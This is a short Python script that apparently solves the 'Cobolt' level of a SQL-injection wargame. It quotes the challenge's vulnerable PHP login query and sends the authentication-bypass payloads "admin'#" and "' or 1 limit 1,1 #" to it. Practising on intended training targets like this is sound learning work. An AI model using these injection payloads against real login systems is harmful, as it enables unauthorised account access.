#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Cobolt - simple sqli injection

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id'] == 'admin') solve("cobolt");
    elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>";
    """

    url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'id'
    payload = "admin'#"  # (id="' or 1 limit 1,1 #")

    p = los.SqlInjection(url, cook, method, inj_param, payload)
    response = p.my_request()

    if 'Clear!' in response:
        print('\nCOBOLT Clear!')


if __name__ == '__main__':
    main()
